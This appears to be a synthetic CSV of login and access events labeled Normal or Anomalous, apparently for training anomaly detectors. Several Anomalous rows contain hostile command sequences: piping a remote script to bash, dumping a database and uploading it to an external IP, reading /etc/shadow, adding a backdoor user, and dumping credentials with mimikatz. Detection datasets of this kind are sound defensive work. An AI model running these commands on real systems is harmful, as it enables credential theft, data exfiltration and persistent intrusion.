entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
4eb4d3f6-e98b-4d97-a4bf-b19a3cb63057,Device,2026-04-15T17:45:56,249.110.169.192,"North Taylorton, Mexico",AWS Console,Password,19061,ssh -i key.pem -> ls,App Server,1,Normal
41acda18-59bc-4153-b8b6-4c61b0cc5bcd,User,2026-04-15T18:43:51,216.152.26.16,"South Theresamouth, Mexico",Payroll,MFA,20795,N/A,Windows 10 - Chrome,1,Normal
c0af5da0-d4e8-4d1f-9b31-aba9aa49fd46,Device,2026-04-15T18:56:34,34.97.13.181,"West Morganview, Mexico",Database,SSO,7430,N/A,App Server,1,Normal
8a04b676-38a0-4957-bd96-58ec583c7f2b,Service Account,2026-04-15T19:14:16,10.235.208.227,"West Taylorton, United Kingdom",GitLab,Hardware Token,10827,N/A,Load Balancer,1,Normal
2bb46819-9189-49a6-9a7d-65399b2ae52c,Service Account,2026-04-15T19:40:27,203.128.232.210,"Port Vasquezville, United States",AWS Console,API Key,24676,N/A,Build Agent,1,Normal
99341f93-2c32-4d00-b33f-346da774c5fd,User,2026-04-15T20:16:12,9.252.5.70,"New Jordanside, Germany",SharePoint,Hardware Token,18351,N/A,macOS 13 - Safari,1,Normal
3102d915-48e1-4c3e-a3d6-409fbfbf3662,User,2026-04-15T23:53:08,222.117.183.14,"Fort Ricardoford, Andorra",HRIS,MFA,17227,N/A,macOS 13 - Safari,1,Normal
6ea79262-3a69-4c98-ae5f-7726fbf2c61a,Service Account,2026-04-16T01:26:23,101.222.156.31,"South Brandonborough, Mauritania",AWS Console,Hardware Token,23370,ssh -i key.pem -> ls,App Server,1,Normal
95e7098d-f8df-48e7-8725-c8c642c7fdaf,User,2026-04-16T02:21:53,96.48.122.240,"East Taylormouth, France",Jira,SSO,20113,N/A,macOS 13 - Chrome,1,Normal
1a0aabb3-be81-4ce3-ad22-2d528e3de76c,User,2026-04-16T02:34:17,205.204.176.43,"North Jordanstad, Mauritius",VPN,MFA,13359,N/A,Windows 10 - Firefox,1,Normal
a4ddd713-109b-4513-917a-f65181216b6a,User,2026-04-16T03:00:02,80.108.177.96,"Lake Morganside, Yemen",Email,Password,46140,N/A,macOS 14 - Safari,0,Anomalous
6592eeb1-f268-4c81-bbfa-d206fed55326,Service Account,2026-04-16T06:36:11,214.140.56.90,"Fort Matthewville, Andorra",AWS Console,SSO,18029,UPDATE records -> pg_dump,Container Host,1,Normal
cbef6cea-82a0-471f-b470-0e39a613e7da,Device,2026-04-16T06:46:04,130.168.82.228,"North Morganview, United Kingdom",Database,Password,14209,N/A,Load Balancer,1,Normal
d81dfdf1-c833-4a72-ae5e-9e0cad21975e,Device,2026-04-16T09:27:59,59.15.112.44,"West Brandonstad, Mauritania",App Server,Password,13795,N/A,App Server,1,Normal
8d94101b-212d-419f-acb2-5dd9d3c6a88c,Device,2026-04-16T09:38:00,186.27.102.236,"Lake Marilynstad, Uganda",AWS Console,Hardware Token,1059,N/A,IoT Gateway,1,Normal
5462b452-4477-409c-980b-072a45c80c82,User,2026-04-16T09:41:18,64.235.251.36,"North Stevenston, United States",CRM,Password,10523,N/A,macOS 13 - Chrome,1,Normal
b2133a63-1171-4364-b8a1-927e13f165a3,Service Account,2026-04-16T10:01:23,105.22.155.93,"Fort Vasquezview, Uganda",AWS Console,SSO,7455,UPDATE records -> pg_dump,App Server,1,Normal
9a679053-302b-4cb0-b3d6-aed473daf5c4,Service Account,2026-04-16T10:16:29,111.184.81.135,"Port Theresaford, Australia",App Server,Hardware Token,3458,N/A,Container Host,1,Normal
526b14a4-2bbc-4458-b2b2-258e95d6772d,User,2026-04-16T10:52:08,89.84.186.55,"Port Morganton, Mauritius",Email,Hardware Token,19816,N/A,Windows 11 - Edge,1,Normal
6f5232fb-256f-4f51-b2f8-49685cb17ac1,Service Account,2026-04-16T12:03:57,8.125.65.134,"Fort Matthewhaven, United Kingdom",App Server,Hardware Token,6047,N/A,Load Balancer,1,Normal
373729eb-8997-451f-afbb-380f96587147,Service Account,2026-04-16T12:55:03,176.168.165.153,"Fort Marilynview, Mexico",Database,Hardware Token,11060,N/A,Container Host,1,Normal
1b664614-9f89-4371-8876-202f8c5dc089,User,2026-04-16T13:35:41,214.178.240.228,"Lake Riveramouth, Germany",Jira,Password,12380,N/A,Windows 10 - Chrome,1,Normal
94f4627f-cfc4-47e6-96e5-8b0e239c2513,Service Account,2026-04-16T13:50:08,191.181.70.21,"East Brandonside, Andorra",App Server,API Key,19514,N/A,Container Host,1,Normal
e2a7dcab-3e26-49f7-8b0a-75e187f7c5c6,Device,2026-04-16T14:09:36,107.148.90.206,"North Marilynborough, Mexico",Database,Hardware Token,10215,N/A,Load Balancer,1,Normal
f02d067a-9a8a-4296-85a2-09a7888e5c82,Device,2026-04-16T14:18:31,209.201.9.112,"South Morganside, Mauritania",Database,Password,8491,git pull -> git push,Build Agent,1,Normal
69ede75b-10c8-4fe1-b1bd-741cb1d9f616,Service Account,2026-04-16T15:01:34,164.50.40.142,"Port Vasquezford, Chile",CI/CD Pipeline,SSO,8803,N/A,IoT Gateway,1,Normal
a2a020b4-df77-4f5b-a104-5c4e6c75cc6e,Device,2026-04-16T15:07:45,96.47.117.157,"Lake Vasquezville, Ghana",VPN,Hardware Token,3633,N/A,App Server,1,Normal
a946a160-65a7-4e92-8809-58ddc8b6a21b,Service Account,2026-04-16T15:40:46,137.176.141.150,"North Vasquezford, France",AWS Console,API Key,6425,N/A,Build Agent,1,Normal
c5be5a79-03e7-486b-9ec4-d788e773a797,Service Account,2026-04-16T16:03:34,120.11.246.60,"East Brandonborough, Australia",CI/CD Pipeline,SSO,13374,N/A,Container Host,1,Normal
820a94b2-1ee9-47a2-bf13-4b1be8df40f4,User,2026-04-16T16:13:45,130.181.164.171,"Fort Jordanside, France",Email,MFA,21121,N/A,Android 14 - Chrome Mobile,1,Normal
a049f2d1-c1b3-4527-8b2f-4180f5df990d,User,2026-04-16T18:09:56,80.202.226.203,"East Jordanview, United Kingdom",Jira,Password,10833,N/A,iOS 17 - Safari Mobile,1,Normal
dcee33a7-1d55-4962-b03b-4175d5d23bca,User,2026-04-16T19:04:52,180.189.129.104,"New Theresaville, Andorra",Payroll,Hardware Token,8424,N/A,Ubuntu 22.04 - Firefox,1,Normal
1a71abe5-1381-4757-8ae1-270d62c16ec3,Service Account,2026-04-16T23:05:58,102.247.125.157,"Fort Morganborough, France",AWS Console,API Key,10185,N/A,IoT Gateway,1,Normal
d43ab5fe-34d3-4e38-8cea-2e890f8bddf4,Device,2026-04-17T00:16:36,215.146.219.226,"New Marilynside, United Kingdom",GitLab,SSO,30400,pg_dump --all -> gzip -> curl upload external-ip,Build Agent,0,Anomalous
28bbf594-5fc2-4641-b44f-d4ce9ec6b846,Device,2026-04-17T00:39:09,66.40.87.190,"North Hallview, Chile",GitLab,Hardware Token,55,pg_dump --all -> gzip -> curl upload external-ip,App Server,1,Anomalous
3b16627d-5c42-48af-8c02-cc2d126235d1,Device,2026-04-17T01:05:49,45.241.164.171,"Lake Brandonhaven, Mexico",AWS Console,Hardware Token,23298,git pull -> git push,App Server,1,Normal
340c98d8-d504-4cab-8650-f46ef33db171,Device,2026-04-17T03:09:30,172.225.54.200,"East Morganview, United Kingdom",AWS Console,Hardware Token,70876,whoami -> sudo su -> cat /etc/shadow,App Server,0,Anomalous
07604604-d09e-4cde-857b-c53744eb6f84,Device,2026-04-17T03:18:07,184.52.25.102,"West Theresamouth, Uganda",AWS Console,Password,46889,net user administrator /active:yes -> reg add HKLM,App Server,1,Anomalous
d1c8cb20-b050-4bf7-9297-5fd6f5919dd4,Service Account,2026-04-17T05:24:55,188.50.16.221,"New Matthewview, Mauritania",AWS Console,SSO,12636,N/A,Container Host,1,Normal
629f0b17-02fe-4a72-96a8-773d592f7c7c,Service Account,2026-04-17T07:56:18,54.112.164.6,"South Marilynhaven, Mauritius",AWS Console,API Key,7674,kubectl get pods -> kubectl logs,App Server,1,Normal
dbcca9fe-ed2e-4737-84fc-e888728fa2dc,Service Account,2026-04-17T08:10:15,99.248.54.187,"Lake Morganview, Mauritania",App Server,API Key,16028,N/A,App Server,1,Normal
df8788a1-3a1e-4d9e-a839-b5b6057bd7c6,Device,2026-04-17T09:14:49,162.29.58.140,"Lake Jordanstad, Andorra",App Server,SSO,11461,terraform plan -> terraform apply,Load Balancer,1,Normal
455dd29a-2c50-48fd-8147-1699885b4bb4,User,2026-04-17T10:07:54,80.207.221.81,"Port Riveraville, France",Email,Hardware Token,21001,N/A,iOS 17 - Safari Mobile,1,Normal
61906023-d7d5-4d20-a572-73d133a97c2d,User,2026-04-17T11:37:13,72.5.36.131,"Fort Matthewhaven, Uganda",CRM,Password,1871,N/A,Windows 11 - Chrome,1,Normal
937aa831-4d60-4f6c-a24c-14f7e7828770,Device,2026-04-17T15:13:09,238.194.213.251,"Lake Ricardoside, Mauritania",GitLab,Password,8279,UPDATE records -> pg_dump,Load Balancer,1,Normal
80a8cfb5-f63f-4d63-a450-00f6f9173aa7,Service Account,2026-04-17T15:32:54,10.253.4.28,"New Hallside, United States",GitLab,API Key,4355,terraform plan -> terraform apply,IoT Gateway,1,Normal
0133c432-83ce-4b6c-90fa-7a2478ee5121,User,2026-04-17T16:38:39,76.8.226.67,"West Taylorville, Mauritania",CRM,Password,333,N/A,Android 14 - Chrome Mobile,1,Normal
43b70299-77d4-43a4-897d-d082f1fb5abb,User,2026-04-17T17:27:16,188.119.62.141,"Port Hallview, United States",Database,MFA,17104,ssh -i key.pem -> ls,Windows 10 - Firefox,1,Normal
551e1632-2f30-441a-8e36-8f456548444d,Device,2026-04-17T19:02:55,228.8.23.250,"Port Taylormouth, United States",Database,Hardware Token,9386,pg_dump,Load Balancer,1,Normal
9baef383-6225-4236-9254-cc306e97757e,User,2026-04-17T19:42:59,134.0.106.124,"East Brandonstad, Germany",SharePoint,MFA,19858,N/A,macOS 14 - Safari,1,Normal
1ed8f112-be5f-406e-bb7c-cd600a301419,User,2026-04-17T20:44:10,141.7.175.131,"West Taylorborough, Chile",CRM,Hardware Token,411,N/A,macOS 13 - Chrome,1,Normal
3568b170-b8e4-4870-85d0-438dfcb774a1,User,2026-04-17T20:44:57,18.67.157.243,"Fort Theresaville, United States",Slack,Biometric,4242,N/A,Android 14 - Chrome Mobile,1,Normal
30f8a5c3-1558-4219-bb2c-f5fd10995aee,Service Account,2026-04-17T21:48:59,88.189.39.226,"Fort Theresahaven, Mexico",AWS Console,Hardware Token,5973,N/A,Container Host,1,Normal
a22c0149-4918-4120-8502-4bff7f65ff79,Service Account,2026-04-17T21:50:54,131.58.37.208,"Lake Morganview, Ghana",Database,SSO,9204,SELECT * FROM records,IoT Gateway,1,Normal
7319e9a3-c6f2-499c-bf83-11ebf3297351,User,2026-04-17T22:20:16,210.176.9.143,"East Riveraview, Uganda",Payroll,Password,2862,N/A,Ubuntu 22.04 - Firefox,1,Normal
c7724429-0246-4a7a-b812-535ba1f871ad,Device,2026-04-17T23:05:23,179.137.215.100,"North Theresahaven, Germany",GitLab,Hardware Token,9427,N/A,Load Balancer,1,Normal
8218419a-ca44-42c8-9a7e-1f3628c6f5a5,Service Account,2026-04-17T23:48:21,15.163.211.203,"East Hallmouth, Australia",GitLab,API Key,9801,N/A,Container Host,1,Normal
709064f7-ab00-40dc-aa74-a6b6428dd5a6,Service Account,2026-04-18T02:51:54,213.18.201.36,"New Hallview, Canada",App Server,Hardware Token,6,net user administrator /active:yes -> reg add HKLM,Load Balancer,1,Anomalous
3292096e-251b-47fb-9485-b8bfde551918,User,2026-04-18T03:08:45,90.171.207.193,"South Brandonford, Mexico",Slack,Hardware Token,12455,N/A,Android 14 - Chrome Mobile,1,Normal
e60c4942-59bb-4b6e-8041-caca774aa754,Device,2026-04-18T03:11:39,75.17.39.96,"East Stevensmouth, Andorra",App Server,Hardware Token,25110,N/A,Container Host,1,Normal
37a06011-22a2-49e7-8d3e-4f567bcfdc64,Device,2026-04-18T03:23:25,71.10.147.254,"Lake Taylorside, Ghana",Database,Hardware Token,24976,N/A,Container Host,1,Normal
d362855d-41a1-456d-9c2c-53be55b9aa47,Service Account,2026-04-18T06:53:07,117.99.217.67,"Fort Taylorside, United Kingdom",CI/CD Pipeline,SSO,13051,terraform plan -> terraform apply,IoT Gateway,1,Normal
1ca6ce49-eb06-4b35-bc4c-b53d86c506c3,Device,2026-04-18T07:06:21,5.121.62.57,"Lake Taylorton, Germany",AWS Console,Hardware Token,20225,N/A,IoT Gateway,1,Normal
9a48872b-3c99-42e2-bfe4-d442332bc79a,Device,2026-04-18T07:31:48,9.78.37.64,"East Hallborough, Netherlands",GitLab,Password,7376,N/A,App Server,1,Normal
1cc71a8b-63fd-4fca-ba9a-9d0a95035a3c,User,2026-04-18T08:29:21,134.80.12.47,"South Stevensborough, Mauritania",Slack,SSO,1756,N/A,Windows 10 - Chrome,1,Normal
c9618562-3226-4403-a478-6624b836b74e,Service Account,2026-04-18T09:18:05,64.151.108.202,"South Taylorview, Canada",CI/CD Pipeline,Hardware Token,1455,N/A,Container Host,1,Normal
d4a0d2ea-6f5b-4008-bed9-44405f24f0c1,Device,2026-04-18T10:55:50,4.67.116.161,"West Hallmouth, France",VPN,Password,19704,N/A,Load Balancer,0,Normal
95598dbc-eec6-420a-a6c8-d5d28a36017a,User,2026-04-18T11:29:22,29.111.253.94,"Lake Jordanstad, Chile",CRM,Biometric,9227,N/A,Ubuntu 22.04 - Chrome,1,Normal
c19f737b-c73e-46d7-bfce-f0f78b0adf15,User,2026-04-18T14:12:17,104.2.137.30,"Fort Taylorborough, Uganda",Email,SSO,14401,N/A,Ubuntu 22.04 - Chrome,1,Normal
e0429bb1-a8af-4c20-8bfd-3f5bd0cc7bae,User,2026-04-18T15:14:48,199.138.253.61,"New Ricardoside, Germany",HRIS,Password,9120,N/A,Windows 11 - Chrome,1,Normal
d73382b6-3625-49dc-b7f7-905c4f49aa9f,Service Account,2026-04-18T15:37:09,158.184.59.124,"New Ricardoborough, Ghana",App Server,API Key,6281,SELECT * FROM records,Load Balancer,1,Normal
51409e99-9400-4953-9622-589c5143f4e6,Device,2026-04-18T15:37:37,120.236.182.6,"West Jordanford, Germany",App Server,SSO,20086,ssh -i key.pem -> ls,Load Balancer,1,Normal
762d5619-7f16-40ee-a6dc-88a865c502d3,Service Account,2026-04-18T15:39:46,69.220.113.185,"Fort Ricardohaven, Mexico",CI/CD Pipeline,SSO,15769,UPDATE records -> pg_dump,IoT Gateway,1,Normal
ebb5621b-03eb-4201-84c4-10c5d7f2380c,Device,2026-04-18T16:04:57,90.25.167.70,"North Marilynmouth, Mexico",AWS Console,Password,6427,SELECT * FROM records,App Server,1,Normal
4e92faee-0f67-4d94-b9be-9115e6c5d289,User,2026-04-18T18:14:18,57.0.174.40,"Lake Jordanside, Australia",SharePoint,SSO,17578,N/A,macOS 13 - Chrome,1,Normal
885d45cc-35f3-4ab7-adb5-567dc5f39e59,User,2026-04-18T18:28:22,63.15.22.110,"Lake Marilynhaven, Australia",Jira,MFA,12451,N/A,macOS 13 - Chrome,1,Normal
e22b9618-dd4a-4122-b931-7dfbc32ae3e4,User,2026-04-18T18:32:22,7.82.207.31,"North Stevensmouth, Netherlands",Jira,Password,12283,N/A,Windows 11 - Chrome,1,Normal
8e230b9c-d264-4bb5-9a7b-54232248cc02,User,2026-04-18T18:35:43,74.164.234.217,"West Brandonview, Germany",SharePoint,Password,8308,N/A,Ubuntu 22.04 - Chrome,1,Normal
6756efbe-7084-449a-a9a0-ba1c14d52dd3,Service Account,2026-04-18T19:43:15,169.119.54.46,"East Vasquezford, Canada",CI/CD Pipeline,Hardware Token,9812,N/A,Load Balancer,1,Normal
a22d5877-dbe2-499b-84a8-60112aad2b6d,User,2026-04-18T20:49:13,138.187.39.24,"North Brandonford, Mexico",SharePoint,Biometric,18892,N/A,Ubuntu 22.04 - Chrome,1,Normal
f89eb804-fd30-427f-9da6-2feffb1b3b7e,Device,2026-04-18T21:59:11,124.55.251.51,"Port Brandonside, United States",App Server,Password,2034,N/A,Container Host,1,Normal
5fbc6809-12b1-4d57-8c6d-6294ec917ab9,Service Account,2026-04-18T22:31:22,116.92.184.213,"West Stevensmouth, Germany",CI/CD Pipeline,Hardware Token,18944,pg_dump,App Server,1,Normal
5335f0d0-a0d5-4931-8459-62e399593df5,Device,2026-04-19T00:13:55,199.76.124.79,"East Hallton, Andorra",Database,Hardware Token,42,curl malicious-payload.sh | bash,IoT Gateway,0,Anomalous
cc3e4445-60a6-4e98-a310-90dcec57b8c8,Device,2026-04-19T01:01:42,31.59.205.250,"Fort Vasquezside, Uganda",AWS Console,SSO,756,UPDATE records -> pg_dump,IoT Gateway,1,Normal
56523e49-cb86-42b7-a784-2e8c57377cfe,Service Account,2026-04-19T01:17:40,177.141.49.202,"Fort Riverastad, Ghana",Database,Hardware Token,31,chmod 777 /etc/passwd -> useradd backdoor,Load Balancer,0,Anomalous
a2538917-66b0-491a-a00f-bd81ab65788a,Service Account,2026-04-19T01:38:39,110.42.9.238,"West Morganford, United States",App Server,API Key,17066,terraform plan -> terraform apply,App Server,1,Normal
1f16f5ef-22de-417d-ac24-a2906b042ab3,Device,2026-04-19T01:58:20,78.188.222.242,"Fort Theresaton, Uganda",GitLab,Password,24689,ssh -i key.pem -> ls,IoT Gateway,1,Normal
a53bb472-be7d-4dff-b6c3-551ecf6f8c96,Device,2026-04-19T02:13:05,9.52.78.101,"West Matthewstad, Andorra",VPN,Hardware Token,24209,N/A,App Server,1,Normal
ae1550b4-2de3-457a-b3ce-1ed6ffe2cc95,User,2026-04-19T02:24:44,185.109.132.160,"South Marilynmouth, Mauritius",Payroll,Hardware Token,24343,N/A,macOS 13 - Safari,1,Normal
9a0959d4-067e-4d19-82d4-8727a9af087c,User,2026-04-19T02:29:41,159.243.247.40,"Lake Taylorton, Andorra",VPN,MFA,3673,N/A,macOS 13 - Safari,1,Normal
51da19be-ef63-4249-a215-a65de884ae41,Service Account,2026-04-19T02:47:53,36.18.45.106,"Port Riverastad, United States",CI/CD Pipeline,Hardware Token,15295,N/A,Load Balancer,1,Normal
ce95fff5-c58d-4045-821a-8e088c4ff861,User,2026-04-19T03:28:01,105.84.126.17,"New Taylorborough, Andorra",VPN,Password,7300,N/A,Windows 11 - Chrome,1,Normal
e4444566-a0a8-4003-8f28-8ad8b0846300,User,2026-04-19T03:46:25,188.235.196.189,"East Theresaview, Iran",Payroll,Password,59,net user administrator /active:yes -> reg add HKLM,Ubuntu 22.04 - Chrome,1,Anomalous
e3c78bab-6530-40ef-817d-d3a0dc3705b9,Service Account,2026-04-19T04:16:37,95.58.67.17,"North Theresaview, Mauritius",AWS Console,API Key,9874,N/A,Load Balancer,1,Normal
2aa50f34-2d94-4c3a-a1f5-f38ed4e912ef,Device,2026-04-19T05:47:35,253.25.111.117,"Port Jordanmouth, Uganda",Database,SSO,19067,N/A,IoT Gateway,1,Normal
d39db227-ac06-4825-bf68-3617f8618743,Device,2026-04-19T06:42:19,239.135.51.102,"South Morganford, Uganda",Database,Password,14616,UPDATE records -> pg_dump,Load Balancer,1,Normal
766a1124-0ce2-4958-be3c-9128491fb405,Service Account,2026-04-19T06:50:39,209.243.108.240,"Lake Matthewstad, Chile",Database,Hardware Token,11254,N/A,Load Balancer,1,Normal
08a50790-bd10-46af-ba95-c638334f0a69,User,2026-04-19T06:55:40,87.204.74.56,"North Stevensford, Mauritius",Email,Password,12992,N/A,Windows 10 - Chrome,1,Normal
c0fa8b65-5b24-4a11-b5f4-d7a1f25b2fad,User,2026-04-19T08:15:51,52.5.3.169,"New Vasquezborough, Netherlands",Database,Biometric,5268,N/A,Windows 11 - Chrome,1,Normal
d382ceec-c14c-400f-898a-9937f583f962,User,2026-04-19T10:00:48,145.57.135.180,"East Riveraburgh, Mauritania",Jira,Biometric,8427,N/A,Windows 11 - Chrome,1,Normal
8d32c437-0330-4c92-872b-89708453ed82,Service Account,2026-04-19T11:31:07,95.0.35.252,"Lake Matthewhaven, Andorra",Database,API Key,17594,N/A,App Server,1,Normal
5492df67-2801-4e2f-80ae-3a16d1711c91,Device,2026-04-19T12:02:53,79.180.139.35,"Port Brandonstad, France",Database,Password,12876,git pull -> git push,Build Agent,1,Normal
c223d2d1-9df8-4a49-a673-84385f20b586,Device,2026-04-19T12:17:46,211.225.44.14,"Fort Taylorburgh, Mauritius",VPN,SSO,25232,N/A,App Server,1,Normal
cda0f4c0-6e4b-4253-91e8-39740d8115a4,Service Account,2026-04-19T12:38:10,50.53.242.173,"Port Morganburgh, Germany",AWS Console,Hardware Token,5771,N/A,Container Host,1,Normal
0098b7da-a414-4aab-8ff5-310427ed1035,Device,2026-04-19T13:29:08,39.97.229.83,"West Theresaford, Mexico",VPN,SSO,20919,N/A,Load Balancer,1,Normal
94c76131-c23d-4cd3-8a55-1bc330a88435,Device,2026-04-19T13:49:24,43.103.0.6,"West Brandonhaven, Canada",Database,Hardware Token,746,N/A,Load Balancer,1,Normal
d63c1bd7-9daa-4df0-9f41-fd23cbe69150,User,2026-04-19T14:19:02,9.235.75.229,"South Taylorton, France",HRIS,SSO,9267,N/A,iOS 17 - Safari Mobile,1,Normal
82e9d8d7-8c40-42f6-aefc-c0e702acaed2,Device,2026-04-19T18:08:28,212.21.52.105,"West Marilynhaven, Netherlands",VPN,Hardware Token,17521,N/A,Build Agent,0,Normal
10705c9c-68e6-479f-a788-fe33406a0e24,Service Account,2026-04-19T19:05:39,47.126.195.122,"East Vasquezside, Venezuela",GitLab,API Key,46,mimikatz.exe sekurlsa::logonpasswords,IoT Gateway,1,Anomalous
a96cc5c5-d0e7-45b0-b7cb-fdaa0741cd1b,User,2026-04-19T23:33:15,73.244.45.99,"East Marilynstad, France",Database,SSO,11855,N/A,macOS 13 - Chrome,1,Normal
97806a52-31d1-407e-97ea-ee7938a0029a,Service Account,2026-04-20T00:00:41,21.153.85.248,"South Taylorville, Germany",AWS Console,Hardware Token,72565,net user administrator /active:yes -> reg add HKLM,Load Balancer,1,Anomalous
91964b6b-b24b-4d2b-9606-a714986e6c93,User,2026-04-20T01:39:50,254.253.200.190,"Fort Vasquezton, Mauritania",Jira,MFA,14078,N/A,macOS 13 - Chrome,1,Normal
dc034fb6-4ba3-4496-9438-36aad4a4a025,User,2026-04-20T04:54:02,128.149.46.235,"Lake Riveraburgh, Andorra",CRM,Biometric,11515,N/A,Windows 10 - Firefox,1,Normal
68403022-5d34-44c8-b7de-74c2f8e0aa63,Service Account,2026-04-20T05:24:40,37.131.56.121,"East Hallton, Mexico",GitLab,Hardware Token,7346,N/A,App Server,1,Normal
ed10eeee-9691-4dcc-8b20-a2565a6aa2c1,Device,2026-04-20T05:57:20,86.57.25.61,"Port Morganhaven, Australia",Database,Password,11615,SELECT * FROM records,Load Balancer,0,Normal
e2092133-b5f9-45a0-8264-23d7083fb329,Device,2026-04-20T06:59:40,195.238.22.16,"New Brandonford, Australia",App Server,SSO,7913,UPDATE records -> pg_dump,App Server,1,Normal
7ad77133-b9c8-472c-80ff-4f3872a12143,Device,2026-04-20T07:01:43,201.173.230.83,"West Riveraton, France",Database,SSO,23470,kubectl get pods -> kubectl logs,Load Balancer,1,Normal
cdbb928a-54ed-4b5f-ba7c-c80aa4055511,User,2026-04-20T08:08:49,252.151.189.53,"South Marilynmouth, Mauritania",CRM,Biometric,931,N/A,macOS 14 - Safari,1,Normal
53136c50-fe97-488e-8c4c-663a2e73397b,User,2026-04-20T08:18:32,175.171.34.60,"Fort Ricardoside, Canada",Payroll,MFA,45340,whoami -> sudo su -> cat /etc/shadow,Android 14 - Chrome Mobile,0,Anomalous
c145fc3e-ec1e-4728-8a66-2c7b12e47f0f,Service Account,2026-04-20T09:28:02,106.117.243.90,"South Hallford, Germany",App Server,Hardware Token,24681,SELECT * FROM records,Build Agent,1,Normal
964709af-e918-4745-a10d-75840ad11657,Service Account,2026-04-20T11:10:43,122.91.160.158,"New Brandonton, Australia",CI/CD Pipeline,API Key,4471,N/A,Build Agent,1,Normal
ff27e727-8bff-48a2-9a2b-8695d4b19a5b,Service Account,2026-04-20T11:44:27,219.217.176.153,"New Marilynville, Uganda",CI/CD Pipeline,API Key,8777,terraform plan -> terraform apply,App Server,1,Normal
10d8dddd-23f8-40fb-ab71-55098c090fcd,Device,2026-04-20T11:54:14,114.65.20.173,"South Hallside, Andorra",App Server,SSO,7312,ssh -i key.pem -> ls,IoT Gateway,1,Normal
04513a96-cd3d-434b-a986-492d8bb20298,Service Account,2026-04-20T13:48:45,77.114.136.169,"North Theresaburgh, France",Database,SSO,20742,N/A,Load Balancer,1,Normal
322ca768-87d1-4bbe-a8dc-582d0f88a9b8,Service Account,2026-04-20T13:53:34,148.17.39.139,"North Vasquezmouth, Mauritania",Database,API Key,1869,kubectl get pods -> kubectl logs,Build Agent,1,Normal
9afbd0b4-b371-40ec-bf05-6d35dfe84c51,Device,2026-04-20T14:16:34,54.214.187.73,"Fort Morganmouth, Mauritius",GitLab,SSO,14043,N/A,App Server,1,Normal
9099defe-85e5-4f43-a3cb-29096c73021c,Device,2026-04-20T15:02:54,124.105.140.41,"North Matthewford, Mexico",AWS Console,Hardware Token,24902,git pull -> git push,IoT Gateway,1,Normal
e1718d6b-f296-45f4-aca1-c0a9d4b5ef3b,Service Account,2026-04-20T17:09:31,246.37.140.134,"Port Theresaside, United States",Database,SSO,21579,UPDATE records -> pg_dump,Load Balancer,1,Normal
5551d7c5-f331-46d2-93d5-225ec57f952a,Device,2026-04-20T18:51:11,247.106.76.4,"Port Stevensville, Ghana",VPN,SSO,11354,N/A,Load Balancer,1,Normal
87c9a34e-4f93-4d43-ab0b-a6361f7b12f9,Service Account,2026-04-20T19:40:27,146.94.161.240,"Port Theresaford, Ghana",AWS Console,Hardware Token,6879,N/A,App Server,1,Normal
9ce6cc60-1abd-409b-af5f-28da09a9bced,Device,2026-04-20T20:00:06,133.39.146.150,"Lake Taylorton, Uganda",AWS Console,SSO,9568,terraform plan -> terraform apply,Load Balancer,1,Normal
2ad0aad5-6058-4743-ae7e-29665c5db58e,User,2026-04-20T20:26:03,58.37.63.116,"East Morganburgh, Mauritania",Jira,Hardware Token,12505,N/A,Ubuntu 22.04 - Chrome,1,Normal
a3419dbc-cb56-4724-82be-83616d8b8d64,Device,2026-04-20T21:19:18,234.127.196.72,"New Vasquezford, Chile",App Server,Password,8015,N/A,Container Host,1,Normal
76e10c4e-e368-49e1-a474-a80a0a257e24,User,2026-04-20T22:27:06,152.180.221.243,"New Taylorview, Netherlands",HRIS,Password,11861,N/A,Windows 10 - Chrome,1,Normal
be0a644f-3a68-4838-b3dc-3724dee06fbf,User,2026-04-20T22:53:42,145.13.134.244,"Port Morganview, Chile",SharePoint,Biometric,12556,N/A,iOS 17 - Safari Mobile,1,Normal
0dcdc998-391c-45bb-813a-af468956f980,Service Account,2026-04-20T23:01:20,124.63.165.46,"New Ricardostad, Chile",Database,Hardware Token,6359,N/A,Load Balancer,1,Normal
4451ffff-5352-4eb5-8dfc-a76f165c47e9,Device,2026-04-20T23:24:44,118.236.73.71,"Port Brandonhaven, United States",GitLab,SSO,7849,terraform plan -> terraform apply,App Server,1,Normal
3e8a9c92-5717-440e-a45f-9c6f85e074bb,Device,2026-04-21T00:28:27,223.29.85.41,"East Theresamouth, Germany",Database,Hardware Token,12576,SELECT * FROM records,App Server,1,Normal
4b4674bd-5681-41e6-ae5d-ff0b566896ab,User,2026-04-21T01:14:46,193.138.160.70,"North Hallborough, Uganda",VPN,Biometric,22684,N/A,Ubuntu 22.04 - Chrome,1,Normal
